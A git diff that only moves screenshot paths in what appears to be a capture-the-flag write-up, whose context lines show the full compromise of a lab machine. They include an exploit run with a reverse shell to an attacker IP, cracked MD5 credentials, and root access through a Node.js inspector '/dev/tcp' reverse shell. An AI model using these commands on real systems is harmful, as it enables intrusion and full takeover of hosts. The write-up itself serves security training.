@@ -76,11 +76,11 @@ X-Powered-By: Next.js
 
 Navigating to `http://10.129.18.115:3000` reveals **ReactorWatch Core Monitoring System v3.2.1** — a nuclear reactor dashboard displaying live sensor data: core temperature, pressure, coolant flow, turbine output, and neutron flux.
 
-![ReactorWatch Dashboard](Website-dashboard.png)
+![ReactorWatch Dashboard](Screenshots/Website-dashboard.png)
 
 The Wappalyzer browser extension was used to passively fingerprint the tech stack without triggering any alerts.
 
-![Wappalyzer Output](Wappalyzer_Result.png)
+![Wappalyzer Output](Screenshots/Wappalyzer_Result.png)
 
 Wappalyzer confirms:
 - **Next.js 15.0.3** (JavaScript framework, web framework, web server, static site generator)
@@ -88,7 +88,7 @@ Wappalyzer confirms:
 
 The version `15.0.3` is the critical detail here. A Google search for vulnerabilities in this exact version leads directly to **CVE-2025-55182**.
 
-![Google Search — CVE Discovery](Ai_Search.png)
+![Google Search — CVE Discovery](Screenshots/Ai_Search.png)
 
 ### Automated — Nuclei
 
@@ -130,7 +130,7 @@ The exploit was then executed against the target, specifying the attacker IP and
 python3 exploit.py -u http://10.129.18.115:3000 -r -l 10.10.14.118 -p 4444 -P nc-mkfifo
 ```
 
-![Initial Shell](Initial_shell.png)
+![Initial Shell](Screenshots/Initial_shell.png)
 
 A reverse shell connection was established from `10.129.18.115:43014`. The shell was spawned as the `node` user. A PTY was immediately upgraded for stability:
 
@@ -150,7 +150,7 @@ This lands on the system as **`node@reactor`** in `/opt/reactor-app`.
 ls -la
 ```
 
-![Initial Results](Initial_results.png)
+![Initial Results](Screenshots/Initial_results.png)
 
 The working directory `/opt/reactor-app` contains the full Next.js application. Notably present is **`reactor.db`** — a SQLite database file.
 
@@ -160,7 +160,7 @@ The working directory `/opt/reactor-app` contains the full Next.js application. 
 ps aux
 ```
 
-![Internal Reconnaissance](internal_reconaissance.png)
+![Internal Reconnaissance](Screenshots/internal_reconaissance.png)
 
 Two entries stand out:
 
@@ -177,7 +177,7 @@ Two entries stand out:
 ss -tulpn
 ```
 
-![Checking Other Ports](checking_other_ports.png)
+![Checking Other Ports](Screenshots/checking_other_ports.png)
 
 Port `127.0.0.1:9229` is confirmed as listening internally. This is the Node.js Inspector debug port belonging to the root-owned process identified above.
 
@@ -191,7 +191,7 @@ Port `127.0.0.1:9229` is confirmed as listening internally. This is the Node.js 
 sqlite3 reactor.db .dump
 ```
 
-![Credentials](credentials.png)
+![Credentials](Screenshots/credentials.png)
 
 The database dump reveals two user accounts:
 
@@ -206,7 +206,7 @@ Both `password_hash` values are unsalted MD5 hashes.
 
 Both hashes were submitted to an online MD5 cracker:
 
-![Hash Cracking](cracking.png)
+![Hash Cracking](Screenshots/cracking.png)
 
 | User      | Hash                               | Result    |
 |-----------|------------------------------------|-----------|
@@ -226,7 +226,7 @@ whoami
 # engineer
 ```
 
-![Engineer Login](engineer_login.png)
+![Engineer Login](Screenshots/engineer_login.png)
 
 ### SSH Login (Alternative Path)
 
@@ -237,7 +237,7 @@ ssh engineer@10.129.18.115
 # Password: reactor1
 ```
 
-![SSH](ssh.png)
+![SSH](Screenshots/ssh.png)
 
 The SSH banner confirms the fictional context: *ReactorWatch Core Monitoring System — Nuclear Dynamics Corp. — Site 7 — AUTHORIZED PERSONNEL ONLY.*
 
@@ -248,7 +248,7 @@ ls -la
 cat user.txt
 ```
 
-![User Flag](user_flag.png)
+![User Flag](Screenshots/user_flag.png)
 
 ```
 eebd5fc18d69094cd712fdfc894f5353
@@ -260,7 +260,7 @@ eebd5fc18d69094cd712fdfc894f5353
 ls /home
 ```
 
-![Another Account](another_account.png)
+![Another Account](Screenshots/another_account.png)
 
 Two home directories exist: `engineer` and `node`. Attempting to access `/home/node` as the engineer user is denied — it belongs to the `node` service account that runs the Next.js application.
 
@@ -288,7 +288,7 @@ From the engineer shell, the `node inspect` client was used to connect:
 node inspect 127.0.0.1:9229
 ```
 
-![First Failed Root Reverse Shell](First_failed_root_reverse_shell.png)
+![First Failed Root Reverse Shell](Screenshots/First_failed_root_reverse_shell.png)
 
 Connection is confirmed: `connecting to 127.0.0.1:9229 ... ok`. A `debug>` prompt is available.
 
@@ -318,7 +318,7 @@ The payload was executed in the Node.js debug REPL:
 exec("process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.118/9002 0>&1\"').toString()")
 ```
 
-![Second Successful Reverse Shell](Second_Successful_reverse_shell.png)
+![Second Successful Reverse Shell](Screenshots/Second_Successful_reverse_shell.png)
 
 **Why `.exec()` with `.toString()` instead of `.execSync()`?**
 
@@ -330,7 +330,7 @@ Using `.execSync()` would block the remote process and wait for the command to c
 
 The netcat listener catches the connection as **root**:
 
-![Root Flag](root_flag.png)
+![Root Flag](Screenshots/root_flag.png)
 
 ```bash
 cd /root
